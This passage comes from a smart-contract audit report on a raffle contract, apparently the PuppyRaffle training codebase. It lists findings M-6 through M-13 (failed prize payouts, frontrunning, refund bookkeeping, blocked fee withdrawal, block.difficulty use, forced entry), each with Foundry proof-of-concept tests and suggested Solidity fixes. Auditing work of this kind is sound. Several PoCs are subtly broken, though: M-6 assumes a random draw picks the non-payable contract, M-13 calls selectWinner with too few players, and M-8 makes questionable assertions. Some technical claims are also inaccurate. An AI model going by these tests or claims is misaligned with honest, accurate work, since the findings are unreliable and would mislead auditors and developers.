The selectWinner function transfers the prize pool to the winner using a low-level call: `(success,) = winner.call{value: prizePool}()`. If the winner is a contract that doesn't have a payable fallback function or if the call fails for any reason, the entire transaction reverts, potentially locking the raffle permanently.

## Impact
If the selected winner cannot receive Ether (e.g., a contract without payable functions), the selectWinner function will always revert, permanently locking the raffle and preventing new rounds from starting.

## Proof of Concept
1. A contract without payable functions enters the raffle. 2. That contract gets selected as winner. 3. selectWinner tries to send Ether to the contract. 4. The transfer fails because contract can't receive Ether. 5. Transaction reverts, raffle is permanently stuck.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract NonPayableWinner {
    PuppyRaffle public puppyRaffle;
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }
    
    function enterRaffle() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(players);
    }
    
    // No payable fallback - cannot receive Ether
}

contract UnexpectedEthTest is Test {
    PuppyRaffle puppyRaffle;
    NonPayableWinner nonPayableWinner;
    address owner = address(1);
    address feeAddress = address(2);
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, feeAddress, 1 days);
        nonPayableWinner = new NonPayableWinner(puppyRaffle);
    }
    
    function testUnexpectedEthToNonPayableWinner() public {
        // Non-payable contract enters raffle
        vm.deal(address(nonPayableWinner), 10 ether);
        nonPayableWinner.enterRaffle{value: 1 ether}();
        
        // Add more players to meet minimum
        address[] memory morePlayers = new address[](3);
        for(uint i = 0; i < 3; i++) {
            morePlayers[i] = address(uint160(i + 100));
            vm.deal(morePlayers[i], 10 ether);
        }
        
        vm.prank(morePlayers[0]);
        puppyRaffle.enterRaffle{value: 3 ether}(morePlayers);
        
        // Fast forward time
        vm.warp(block.timestamp + 1 days + 1);
        
        // If non-payable contract wins, selectWinner will revert
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();
    }
}

## Suggested Mitigation
Implement a pull payment pattern where winners can claim their prizes instead of pushing payments: ```solidity
mapping(address => uint256) public pendingPrizes;

function selectWinner() external {
    // ... existing validation logic ...
    
    address winner = players[winnerIndex];
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    
    // Store prize for winner to claim instead of sending immediately
    pendingPrizes[winner] += prizePool;
    
    // Continue with NFT minting and other logic
    _safeMint(winner, tokenId);
    
    // Reset raffle state
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
}

function claimPrize() external {
    uint256 prize = pendingPrizes[msg.sender];
    require(prize > 0, "No prize to claim");
    
    pendingPrizes[msg.sender] = 0;
    (bool success,) = msg.sender.call{value: prize}();
    require(success, "Prize transfer failed");
}

// Or use try-catch for graceful failure handling:
function selectWinner() external {
    // ... existing logic ...
    
    try this.sendPrize(winner, prizePool) {
        // Prize sent successfully
    } catch {
        // Store prize for later claim
        pendingPrizes[winner] += prizePool;
    }
}

function sendPrize(address winner, uint256 amount) external {
    require(msg.sender == address(this), "Only self-call");
    (bool success,) = winner.call{value: amount}();
    require(success, "Prize transfer failed");
}```

## [M-7]. Access Control issue in PuppyRaffle::selectWinner

## Description
The contract allows anyone to call selectWinner() without any access control restrictions. While there are time and player count requirements, there's no restriction on who can trigger the winner selection, potentially allowing MEV attacks or manipulation.

## Impact
MEV bots or malicious actors can time the selectWinner call to their advantage, potentially manipulating randomness through transaction ordering or block manipulation, especially since randomness depends on block.timestamp and msg.sender.

## Proof of Concept
1. MEV bot monitors the mempool when raffle duration ends. 2. Bot sees selectWinner transaction from honest user. 3. Bot frontruns with their own selectWinner call, using msg.sender in randomness calculation to their advantage. 4. Bot can influence outcome by controlling the timing and sender address.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract MEVBot {
    PuppyRaffle puppyRaffle;
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }
    
    function frontrunSelectWinner() external {
        // MEV bot calls selectWinner to manipulate randomness
        puppyRaffle.selectWinner();
    }
}

contract AccessControlTest is Test {
    PuppyRaffle puppyRaffle;
    MEVBot mevBot;
    address owner = address(1);
    address feeAddress = address(2);
    address player1 = address(3);
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, feeAddress, 1 days);
        mevBot = new MEVBot(puppyRaffle);
    }
    
    function testAnyoneCanSelectWinner() public {
        // Setup raffle with minimum players
        address[] memory players = new address[](4);
        for(uint i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 100));
            vm.deal(players[i], 10 ether);
        }
        
        vm.prank(players[0]);
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        
        // Fast forward time
        vm.warp(block.timestamp + 1 days + 1);
        
        // Anyone can call selectWinner - including MEV bots
        mevBot.frontrunSelectWinner();
        
        // Verify winner was selected
        assertTrue(puppyRaffle.previousWinner() != address(0), "Winner was selected by MEV bot");
    }
}

## Suggested Mitigation
Add access control to limit who can call selectWinner or implement a commit-reveal scheme: ```solidity
// Option 1: Restrict to owner or participants
modifier onlyOwnerOrPlayer() {
    require(msg.sender == owner() || _isActivePlayer(), "Not authorized");
    _;
}

function selectWinner() external onlyOwnerOrPlayer {
    // ... existing logic
}

// Option 2: Implement commit-reveal scheme
mapping(address => bytes32) public commitments;
uint256 public commitPhaseEnd;

function commitRandomness(bytes32 commitment) external {
    require(block.timestamp < commitPhaseEnd, "Commit phase ended");
    commitments[msg.sender] = commitment;
}

function selectWinner(uint256 nonce) external {
    require(block.timestamp >= commitPhaseEnd, "Still in commit phase");
    require(keccak256(abi.encodePacked(msg.sender, nonce)) == commitments[msg.sender], "Invalid commitment");
    
    // Use committed randomness instead of block properties
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(nonce, block.timestamp))) % players.length;
    // ... rest of logic
}

// Option 3: Add delay to prevent immediate manipulation
uint256 public selectionDelay = 10 minutes;
mapping(address => uint256) public selectionRequests;

function requestSelection() external {
    selectionRequests[msg.sender] = block.timestamp;
}

function selectWinner() external {
    require(selectionRequests[msg.sender] != 0, "Must request selection first");
    require(block.timestamp >= selectionRequests[msg.sender] + selectionDelay, "Selection delay not met");
    // ... existing logic
}```

## [M-8]. Array Limits issue in PuppyRaffle::refund

## Description
The `refund` function in the PuppyRaffle contract sets the player's address to `address(0)` but doesn't update any other data structures to reflect this change. When checking for duplicate players in `enterRaffle`, the contract doesn't handle these refunded players correctly:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}
```

## Impact
This implementation leads to several issues: 1) The players array keeps growing even when players get refunded, increasing gas costs for everyone, 2) Players can lose funds by mistakenly re-entering with a refunded address, 3) The contract's accounting of active players vs. refunded players is incorrect which could lead to miscalculations of prize pools.

## Proof of Concept
1. Deploy the contract and have several players join
2. Some players request refunds, setting their entries to address(0)
3. New players try to enter but face unusually high gas costs due to the array containing address(0) entries
4. The prize pool calculation includes the refunded players, giving an incorrect distribution

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RefundArrayIssueTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
    }
    
    function testArrayWithRefundedPlayers() public {
        // Initial players
        address[] memory players = new address[](5);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        players[4] = address(5);
        
        // Enter the raffle
        puppyRaffle.enterRaffle{value: entranceFee * 5}(players);
        
        // Player at index 2 requests a refund
        vm.prank(address(3));
        puppyRaffle.refund(2);
        
        // Check that the player's address is now address(0)
        assertEq(puppyRaffle.getActivePlayerIndex(address(3)), 0, "Player should be removed");
        
        // Try to enter with a new player
        address[] memory newPlayers = new address[](1);
        newPlayers[0] = address(6);
        
        // Measure gas used for entering raffle
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee}(newPlayers);
        uint256 gasUsed = gasStart - gasleft();
        
        console.log("Gas used for enterRaffle with refunded players:", gasUsed);
        
        // Fast forward past raffle duration
        vm.warp(block.timestamp + 1 days + 1);
        
        // Select winner
        uint256 balanceBefore = address(this).balance;
        puppyRaffle.selectWinner();
        uint256 balanceAfter = address(this).balance;
        
        // Calculate expected prize pool based on active players (5 initial + 1 new - 1 refunded = 5)
        uint256 expectedPrizePool = (entranceFee * 5 * 80) / 100;
        
        // Since this test contract is the feeAddress, check if we received the correct fees
        uint256 receivedFees = balanceAfter - balanceBefore;
        uint256 expectedFees = (entranceFee * 5 * 20) / 100;
        
        assertEq(receivedFees, expectedFees, "Fee calculation should be based on actual player count");
    }
}

## Suggested Mitigation
Redesign the player management system to efficiently handle refunds and maintain accurate player counts. One approach is to use a mapping for active players and maintain a separate array for active player addresses:

```solidity
// Add mappings and modified player tracking
address[] public players;
mapping(address => bool) public isActivePlayer;
mapping(address => uint256) public playerIndexes;
uint256 public activePlayerCount;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        require(!isActivePlayer[player], "PuppyRaffle: Duplicate player");
        
        players.push(player);
        isActivePlayer[player] = true;
        playerIndexes[player] = players.length - 1;
        activePlayerCount++;
    }
    
    emit RaffleEnter(newPlayers);
}

function refund(uint256 playerIndex) public {
    require(playerIndex < players.length, "PuppyRaffle: Invalid player index");
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(isActivePlayer[playerAddress], "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    
    // Update player tracking
    isActivePlayer[playerAddress] = false;
    activePlayerCount--;
    
    emit RaffleRefunded(playerAddress);
}

function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(activePlayerCount >= 4, "PuppyRaffle: Need at least 4 active players");
    
    // Get only active players for winner selection
    address[] memory activePlayers = new address[](activePlayerCount);
    uint256 activeIndex = 0;
    
    for (uint256 i = 0; i < players.length; i++) {
        if (isActivePlayer[players[i]]) {
            activePlayers[activeIndex] = players[i];
            activeIndex++;
        }
    }
    
    // Continue with winner selection using activePlayers array
    // ... rest of the function
    
    // Reset for next round
    for (uint256 i = 0; i < players.length; i++) {
        if (isActivePlayer[players[i]]) {
            isActivePlayer[players[i]] = false;
        }
    }
    delete players;
    activePlayerCount = 0;
    // ... rest of the function
}
```

## [M-9]. MEV issue in PuppyRaffle::enterRaffle

## Description
The PuppyRaffle contract is vulnerable to MEV (Miner/Maximal Extractable Value) attacks, particularly through frontrunning during the `enterRaffle` and `selectWinner` functions. Miners or validators can observe pending transactions and manipulate their order to gain an unfair advantage.

For example, in `enterRaffle`, someone can observe a transaction with a unique list of players and frontrun it with their own transaction containing the same players plus additional ones, causing the original transaction to fail due to the duplicate check:

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    // ... [code omitted for brevity]
    
    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    // ... [more code]
}
```

## Impact
MEV attacks can lead to transaction failures for legitimate users, denial of service, and unfair advantage for attackers. Specifically:
1. Users may have their raffle entry transactions fail due to frontrunning
2. Miners can manipulate the selection of winners to their advantage
3. Users may face higher gas costs due to Priority Gas Auctions (PGAs) when competing with MEV attackers

## Proof of Concept
1. Alice submits a transaction to enter the raffle with addresses A, B, C, D
2. Bob (a malicious validator) sees this transaction in the mempool
3. Bob frontrunns Alice's transaction with his own transaction including addresses A, B, C, D, and E
4. When Alice's transaction executes, it will revert due to duplicate addresses
5. Alice must submit a new transaction with higher gas to enter the raffle

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract MevAttackTest is Test {
    PuppyRaffle puppyRaffle;
    address alice = address(0xa11ce);
    address bob = address(0xb0b);
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Fund the participants
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
    }
    
    function testFrontrunningAttack() public {
        // Alice prepares to enter the raffle
        address[] memory alicePlayers = new address[](4);
        alicePlayers[0] = address(1);
        alicePlayers[1] = address(2);
        alicePlayers[2] = address(3);
        alicePlayers[3] = address(4);
        
        // Alice submits her transaction, but it's not yet mined
        // (In Foundry, we simulate this by not executing it yet)
        
        // Bob sees Alice's transaction in the mempool and frontrunns it
        address[] memory bobPlayers = new address[](5);
        bobPlayers[0] = address(1);  // Same players as Alice's tx
        bobPlayers[1] = address(2);
        bobPlayers[2] = address(3);
        bobPlayers[3] = address(4);
        bobPlayers[4] = address(5);  // Plus one extra
        
        vm.prank(bob);
        puppyRaffle.enterRaffle{value: entranceFee * 5}(bobPlayers);
        
        // Now Alice's transaction gets mined, but it will fail due to duplicates
        vm.prank(alice);
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 4}(alicePlayers);
        
        // Alice's transaction failed and she wasted gas
        // Bob successfully added all players including the ones Alice wanted to add
    }
}

## Suggested Mitigation
Several strategies can help mitigate MEV attacks:

1. Implement a commit-reveal scheme for entering the raffle:

```solidity
// Add mapping for commitments
mapping(address => bytes32) public commitments;
mapping(address => bool) public revealedPlayers;
uint256 public commitPhaseEnd;
uint256 public revealPhaseEnd;

function commitToRaffle(bytes32 commitment) public {
    require(block.timestamp < commitPhaseEnd, "Commit phase ended");
    commitments[msg.sender] = commitment;
}

function revealEntry(address[] memory myPlayers, uint256 nonce) public payable {
    require(block.timestamp >= commitPhaseEnd && block.timestamp < revealPhaseEnd, "Not in reveal phase");
    require(!revealedPlayers[msg.sender], "Already revealed");
    require(commitments[msg.sender] == keccak256(abi.encode(myPlayers, nonce, msg.sender)), "Invalid commitment");
    require(msg.value == entranceFee * myPlayers.length, "Incorrect payment");
    
    revealedPlayers[msg.sender] = true;
    
    // Add players to the raffle
    for (uint256 i = 0; i < myPlayers.length; i++) {
        // Check that the player hasn't already been entered
        for (uint256 j = 0; j < players.length; j++) {
            require(players[j] != myPlayers[i], "Duplicate player");
        }
        players.push(myPlayers[i]);
    }
    
    emit RaffleEnter(myPlayers);
}
```

2. Use a private mempool or Flashbots to protect transactions from frontrunning.

3. Consider using a fairness protocol like Chainlink VRF for winner selection to prevent manipulation.

## [M-10]. DOS issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function is vulnerable to a potential attack where a malicious actor can front-run the transaction and block fee withdrawals. The function checks if the contract's balance equals the totalFees before allowing a withdrawal, but this check can be manipulated.

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Impact
A malicious actor can send a small amount of ETH directly to the contract (not through the enterRaffle function), which would make the contract's balance not equal to totalFees. This would prevent the owner from withdrawing fees, effectively locking them in the contract indefinitely.

## Proof of Concept
1. The contract accumulates fees through multiple raffle rounds
2. When the owner attempts to withdraw fees, a malicious actor monitors the mempool
3. The attacker front-runs the withdrawFees transaction with a transaction that sends a small amount of ETH (e.g., 1 wei) directly to the contract
4. The check `address(this).balance == uint256(totalFees)` now fails
5. The owner's withdrawFees transaction reverts, and fees remain locked in the contract

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract WithdrawFeesBlockTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    address attacker = address(0x1337);
    address owner;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
        owner = puppyRaffle.owner();
        
        // Fund the attacker
        vm.deal(attacker, 1 ether);
        
        // Add some players and generate fees
        address[] memory players = new address[](5);
        for (uint256 i = 0; i < 5; i++) {
            players[i] = address(uint160(i + 10));
            vm.deal(players[i], entranceFee);
        }
        
        for (uint256 i = 0; i < 5; i++) {
            vm.prank(players[i]);
            address[] memory singlePlayer = new address[](1);
            singlePlayer[0] = players[i];
            puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        }
        
        // Fast forward past raffle duration and select winner to generate fees
        vm.warp(block.timestamp + duration + 1);
        puppyRaffle.selectWinner();
        
        // Verify fees were collected
        assertGt(puppyRaffle.totalFees(), 0, "Should have collected fees");
    }
    
    function testFrontRunWithdrawFees() public {
        uint256 initialFees = puppyRaffle.totalFees();
        console.log("Initial fees:", initialFees);
        
        // Attacker front-runs the withdrawFees transaction
        vm.prank(attacker);
        (bool sent, ) = address(puppyRaffle).call{value: 1}(""); // Send 1 wei
        assertTrue(sent, "Failed to send ETH");
        
        // Now the contract balance doesn't match totalFees
        assertEq(
            address(puppyRaffle).balance,
            uint256(puppyRaffle.totalFees()) + 1,
            "Contract balance should be totalFees + 1 wei"
        );
        
        // Owner tries to withdraw fees but it fails
        vm.prank(owner);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
        
        // Fees remain locked in the contract
        assertEq(puppyRaffle.totalFees(), initialFees, "Fees should not have changed");
    }
}

## Suggested Mitigation
Modify the withdrawFees function to allow withdrawals even if there's a small discrepancy in the balance:

```solidity
function withdrawFees() external {
    // Remove the strict equality check
    require(address(this).balance >= uint256(totalFees), "PuppyRaffle: Not enough balance");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

Alternatively, implement a more robust accounting system that tracks fees separately from the active raffle funds:

```solidity
// Add this state variable
bool public raffleActive;

function enterRaffle(address[] memory newPlayers) public payable {
    // Mark raffle as active when players enter
    raffleActive = true;
    
    // Rest of the function remains the same
}

function selectWinner() external {
    // ... existing code ...
    
    // Mark raffle as inactive after selecting winner
    raffleActive = false;
    
    // ... rest of the function ...
}

function withdrawFees() external {
    // Only check if there's an active raffle, not the exact balance
    require(!raffleActive, "PuppyRaffle: Raffle is active");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-11]. Pragma issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses block.difficulty as a source of randomness, which is deprecated in Solidity 0.8.0 and replaced with prevrandao in newer versions. This could lead to compatibility issues when upgrading the contract or when the Ethereum network changes its consensus mechanism.

```solidity
function selectWinner() external {
    // ... other code ...
    
    // Select a winner
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    
    // ... other code ...
    
    // Select rarity
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    
    // ... other code ...
}
```

## Impact
After the Ethereum Merge, block.difficulty was replaced with prevrandao, which has different properties. Using the deprecated block.difficulty could lead to unexpected behavior or broken functionality when the contract is deployed on post-Merge Ethereum or when upgrading to newer Solidity versions.

## Proof of Concept
1. The contract is deployed on Ethereum mainnet
2. After the Merge, block.difficulty no longer represents mining difficulty but instead returns the prevrandao value
3. This changes the randomness properties and could affect the fairness of winner selection and rarity distribution

## Proof of Code
// This is a conceptual demonstration as it's difficult to simulate the Merge in a unit test

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract PragmaTest is Test {
    function testBlockDifficultyDeprecation() public {
        // Pre-Merge behavior
        vm.difficulty(12345); // Set a mining difficulty
        uint256 preMergeDifficulty = block.difficulty;
        
        console.log("Pre-Merge difficulty:", preMergeDifficulty);
        
        // Post-Merge behavior (conceptual)
        // After the Merge, block.difficulty returns prevrandao
        // which is a random value provided by the beacon chain
        // This is just a simulation - in reality, the behavior changed at the network level
        
        // The key issue is that code written expecting mining difficulty behavior
        // may not work as expected with the new prevrandao behavior
        
        // For example, if the contract assumes certain properties of block.difficulty
        // (like it being related to mining difficulty), those assumptions are no longer valid
        
        // This can affect randomness generation, as the distribution and predictability
        // of values has changed
    }
}

## Suggested Mitigation
Update the contract to use the current recommended approach for accessing randomness in newer Solidity versions:

```solidity
// For Solidity 0.8.x
function selectWinner() external {
    // ... other code ...
    
    // Use prevrandao (formerly block.difficulty) with a comment explaining the change
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.prevrandao))) % players.length;
    
    // ... other code ...
    
    // Update here too
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao))) % 100;
    
    // ... other code ...
}
```

However, as mentioned in the randomness vulnerability, the best solution is to use a secure randomness source like Chainlink VRF instead of relying on block properties.

## [M-12]. Access Control issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function allows anyone to enter other addresses into the raffle without their consent. This could be exploited to force users to participate in the raffle and potentially block them from entering with their preferred addresses.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}
```

## Impact
Malicious actors can enter other users' addresses into the raffle without their permission. This could prevent those users from entering the raffle with their own addresses (due to the duplicate check) and could lead to confusion if they win but didn't intend to participate. Additionally, if a user wants to refund, they would need to control the private key of the entered address.

## Proof of Concept
1. Alice wants to enter the raffle with her address
2. Bob, a malicious actor, monitors the mempool and sees Alice's transaction
3. Bob front-runs Alice's transaction and enters her address into the raffle
4. When Alice's transaction is processed, it reverts due to the duplicate player check
5. Alice is now entered in a raffle she didn't intend to join and cannot enter with her preferred address

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract AccessControlTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    
    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
        
        // Fund Alice and Bob
        vm.deal(alice, entranceFee * 2);
        vm.deal(bob, entranceFee * 2);
    }
    
    function testForcedEntry() public {
        // Bob enters Alice's address into the raffle
        address[] memory bobPlayers = new address[](1);
        bobPlayers[0] = alice;
        
        vm.prank(bob);
        puppyRaffle.enterRaffle{value: entranceFee}(bobPlayers);
        
        // Verify Alice is now in the raffle
        bool aliceInRaffle = false;
        for (uint256 i = 0; i < 1; i++) {
            if (puppyRaffle.players(i) == alice) {
                aliceInRaffle = true;
                break;
            }
        }
        assertTrue(aliceInRaffle, "Alice should be in the raffle");
        
        // Now Alice tries to enter herself
        address[] memory alicePlayers = new address[](1);
        alicePlayers[0] = alice;
        
        vm.prank(alice);
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee}(alicePlayers);
        
        // Alice cannot refund because she didn't enter herself
        uint256 aliceIndex = puppyRaffle.getActivePlayerIndex(alice);
        
        vm.prank(alice);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        puppyRaffle.refund(aliceIndex);
        
        // Only Bob can refund Alice's entry
        vm.prank(bob);
        puppyRaffle.refund(aliceIndex);
    }
}

## Suggested Mitigation
Modify the enterRaffle function to only allow users to enter themselves, or require a signature from each entered address:

```solidity
// Option 1: Only allow users to enter themselves
function enterRaffle() public payable {
    require(msg.value == entranceFee, "PuppyRaffle: Must send enough to enter raffle");
    
    // Check for duplicates first to save gas if the player is already in the raffle
    for (uint256 i = 0; i < players.length; i++) {
        require(players[i] != msg.sender, "PuppyRaffle: Duplicate player");
    }
    
    players.push(msg.sender);
    emit RaffleEnter(msg.sender);
}

// Option 2: Allow entering multiple addresses but require signatures
// This would need additional state variables and functions for signature verification
function enterRaffle(address[] memory newPlayers, bytes[] memory signatures) public payable {
    require(newPlayers.length == signatures.length, "PuppyRaffle: Must provide signature for each player");
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        bytes memory signature = signatures[i];
        
        // Verify that the player has signed a message approving their entry
        bytes32 messageHash = keccak256(abi.encodePacked("I approve entering the PuppyRaffle", address(this)));
        require(recoverSigner(messageHash, signature) == player, "PuppyRaffle: Invalid signature");
        
        // Check for duplicates
        for (uint256 j = 0; j < players.length; j++) {
            require(players[j] != player, "PuppyRaffle: Duplicate player");
        }
        
        players.push(player);
    }
    
    emit RaffleEnter(newPlayers);
}

// Helper function for signature verification
function recoverSigner(bytes32 messageHash, bytes memory signature) internal pure returns (address) {
    bytes32 ethSignedMessageHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash));
    
    (uint8 v, bytes32 r, bytes32 s) = splitSignature(signature);
    
    return ecrecover(ethSignedMessageHash, v, r, s);
}

function splitSignature(bytes memory signature) internal pure returns (uint8 v, bytes32 r, bytes32 s) {
    require(signature.length == 65, "Invalid signature length");
    
    assembly {
        r := mload(add(signature, 32))
        s := mload(add(signature, 64))
        v := byte(0, mload(add(signature, 96)))
    }
}
```

Option 1 is simpler but more restrictive, while Option 2 provides more flexibility but is more complex to implement.

## [M-13]. Access Control issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function incorrectly assumes that the contract's balance is equal to the accumulated fees, but it could have additional ETH from active players. This leads to a condition that prevents fee withdrawal if there are active players in the raffle.

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

The require statement checks if the contract's balance equals totalFees, which would only be true if there are no active players. However, this prevents fee withdrawal during active raffles even though the fees have been properly accounted for.

## Impact
The contract owner cannot withdraw collected fees if there are active players in the raffle. This creates an unnecessary restriction and could lock fees in the contract for extended periods, especially if raffles run back-to-back with players always active. If the contract is ever in a state where it can't complete a raffle (due to other bugs or external issues), the fees could be permanently locked.

## Proof of Concept
1. A raffle begins and several players enter, each paying the entrance fee
2. After the winner is selected, 20% of the total amount is added to totalFees
3. Before these fees can be withdrawn, a new raffle starts and new players enter
4. Now the contract's balance consists of both the accumulated fees and the new players' entrance fees
5. The condition `address(this).balance == uint256(totalFees)` will fail because the balance includes both fees and active players' funds
6. The owner cannot withdraw fees until there are zero active players, which might never happen in a popular raffle

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract FeeWithdrawalTest is Test {
    PuppyRaffle puppyRaffle;
    address user1 = address(1);
    address user2 = address(2);
    address feeAddress = address(99);
    uint256 entranceFee = 1e18;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            1 weeks
        );
        vm.deal(user1, 10e18);
        vm.deal(user2, 10e18);
    }

    function testCannotWithdrawFeesWithActivePlayers() public {
        // First complete a raffle to generate some fees
        address[] memory players = new address[](4);
        players[0] = user1;
        players[1] = address(3);
        players[2] = address(4);
        players[3] = address(5);
        
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        vm.warp(block.timestamp + 1 weeks + 1);
        puppyRaffle.selectWinner();
        
        // Verify we have some fees
        uint256 feesCollected = puppyRaffle.totalFees();
        assertGt(feesCollected, 0);
        
        // Now start a new raffle with active players
        address[] memory newPlayers = new address[](2);
        newPlayers[0] = user2;
        newPlayers[1] = address(6);
        
        vm.prank(user2);
        puppyRaffle.enterRaffle{value: entranceFee * 2}(newPlayers);
        
        // Try to withdraw fees
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
        
        // Verify balance includes both fees and active player funds
        assertEq(address(puppyRaffle).balance, feesCollected + (entranceFee * 2));
        
        // Now complete the raffle and try again
        vm.warp(block.timestamp + 1 weeks + 1);
        puppyRaffle.selectWinner();
        
        // Now we should be able to withdraw
        uint256 totalFeesBeforeWithdraw = puppyRaffle.totalFees();
        uint256 feeAddressBalanceBefore = address(feeAddress).balance;
        
        puppyRaffle.withdrawFees();
        
        assertEq(puppyRaffle.totalFees(), 0);
        assertEq(address(feeAddress).balance, feeAddressBalanceBefore + totalFeesBeforeWithdraw);
    }
}

## Suggested Mitigation
